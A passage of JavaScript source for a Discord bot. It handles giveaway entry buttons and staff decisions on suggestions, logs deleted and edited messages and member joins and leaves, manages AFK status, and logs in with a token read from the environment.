
      const bannedRoles = db.giveawayBanRoles[guild.id] || [];
      if (member.roles.cache.some(r => bannedRoles.includes(r.id))) {
        return interaction.reply({ content: 'Your role is blacklisted from joining giveaways.', ephemeral: true });
      }

      if (!gw.entries.includes(user.id)) {
        gw.entries.push(user.id);
        saveData();
        return interaction.reply({ content: '🎉 You have entered the giveaway!', ephemeral: true });
      } else {
        gw.entries = gw.entries.filter(id => id !== user.id);
        saveData();
        return interaction.reply({ content: 'You left the giveaway.', ephemeral: true });
      }
    }

    // Suggestion Staff Decision Buttons
    if (['sug_approve', 'sug_deny', 'sug_consider'].includes(customId)) {
      if (!isBotAdmin(member)) return interaction.reply({ content: 'Only staff can manage suggestions.', ephemeral: true });
      const embed = EmbedBuilder.from(message.embeds[0]);

      if (customId === 'sug_approve') {
        embed.setColor('#57F287').setTitle('💡 Suggestion [APPROVED]');
      } else if (customId === 'sug_deny') {
        embed.setColor('#ED4245').setTitle('💡 Suggestion [DENIED]');
      } else if (customId === 'sug_consider') {
        embed.setColor('#FEE75C').setTitle('💡 Suggestion [UNDER CONSIDERATION]');
      }

      await message.edit({ embeds: [embed] });
      return interaction.reply({ content: 'Suggestion status updated.', ephemeral: true });
    }
  }
});

// --- AUTOMATED AUDIT & EVENT LOGGING ---
client.on('messageDelete', async message => {
  if (!message.guild || message.author?.bot) return;
  const embed = new EmbedBuilder()
    .setTitle('🗑️ Message Deleted')
    .addFields(
      { name: 'Author', value: `${message.author.tag} (${message.author.id})` },
      { name: 'Channel', value: `${message.channel}` },
      { name: 'Content', value: message.content || 'None (or embed/attachment)' }
    )
    .setColor('#ED4245')
    .setTimestamp();
  sendLog(message.guild, embed);
});

client.on('messageUpdate', async (oldMsg, newMsg) => {
  if (!oldMsg.guild || oldMsg.author?.bot || oldMsg.content === newMsg.content) return;
  const embed = new EmbedBuilder()
    .setTitle('✏️ Message Edited')
    .addFields(
      { name: 'Author', value: `${oldMsg.author.tag}` },
      { name: 'Channel', value: `${oldMsg.channel}` },
      { name: 'Before', value: oldMsg.content || 'None' },
      { name: 'After', value: newMsg.content || 'None' }
    )
    .setColor('#FEE75C')
    .setTimestamp();
  sendLog(oldMsg.guild, embed);
});

client.on('guildMemberAdd', member => {
  const embed = new EmbedBuilder()
    .setTitle('📥 Member Joined')
    .setDescription(`${member.user.tag} (${member.id}) joined the server.`)
    .setColor('#57F287')
    .setTimestamp();
  sendLog(member.guild, embed);
});

client.on('guildMemberRemove', member => {
  const embed = new EmbedBuilder()
    .setTitle('📤 Member Left')
    .setDescription(`${member.user.tag} (${member.id}) left the server.`)
    .setColor('#ED4245')
    .setTimestamp();
  sendLog(member.guild, embed);
});

// --- AFK AUTO-CLEAR & MENTION NOTIFIER ---
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  // Clear AFK if user types
  if (db.afk[message.author.id]) {
    delete db.afk[message.author.id];
    saveData();
    message.reply({ content: `Welcome back ${message.author}! Your AFK status has been cleared.` }).then(m => setTimeout(() => m.delete().catch(() => {}), 5000));
  }

  // Check if mentioned users are AFK
  if (message.mentions.users.size > 0) {
    message.mentions.users.forEach(u => {
      if (db.afk[u.id]) {
        const afkData = db.afk[u.id];
        message.reply({ content: `ℹ️ **${u.tag}** is currently AFK: ${afkData.reason}` });
      }
    });
  }
});

// --- LOG IN TO DISCORD ---
client.login(process.env.DISCORD_TOKEN);
